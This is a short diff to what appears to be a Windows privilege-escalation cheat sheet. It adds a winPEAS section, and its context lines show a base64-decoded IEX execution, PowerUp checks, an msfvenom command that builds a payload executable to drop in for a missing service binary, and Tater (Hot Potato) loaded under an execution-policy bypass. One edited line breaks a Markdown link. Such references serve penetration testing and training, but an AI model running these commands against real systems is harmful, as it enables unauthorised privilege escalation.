@@ -31,6 +31,11 @@ IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((G
 Invoke-AllChecks -ErrorAction SilentlyContinue | Out-File -Encoding ASCII powerup.log
 ```
 
+### [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
+```powershell
+.\winPEAS.exe
+```
+
 ---
 
 ## Services
@@ -529,7 +534,7 @@ msfvenom -p <payload> <payload params> -f exe -o <missing binary>.exe
 ---
 
 ## Hot Potato
-[Tater.ps1](https://github.com/Kevin-Robertson/Tater)
+[Tater.ps1](https://github.com/Kevin-Robertson/Tater>
 ```powershell
 powershell -nop -ep bypass
 Import-Module <Tater.ps1 path>
